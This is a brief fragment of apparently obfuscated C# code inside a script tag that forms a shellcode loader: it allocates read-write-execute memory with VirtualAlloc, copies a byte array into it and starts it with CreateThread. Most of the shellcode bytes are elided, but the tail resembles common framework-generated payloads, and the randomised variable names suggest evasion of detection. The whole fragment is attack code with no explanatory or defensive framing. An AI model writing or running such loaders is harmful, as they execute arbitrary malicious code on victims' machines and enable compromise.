...
0x00,0x53,0xff,0xd5 };
        ...
        IntPtr mvZm4A2pZFK = VirtualAlloc(IntPtr.Zero,(UIntPtr)uJxi7WM2Rl.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(uJxi7WM2Rl,0,mvZm4A2pZFK,uJxi7WM2Rl.Length);
        IntPtr zX9ACc9dV = IntPtr.Zero;
        IntPtr iqnHpt = CreateThread(IntPtr.Zero,UIntPtr.Zero,mvZm4A2pZFK,IntPtr.Zero,0,ref zX9ACc9dV);
    }
</script>
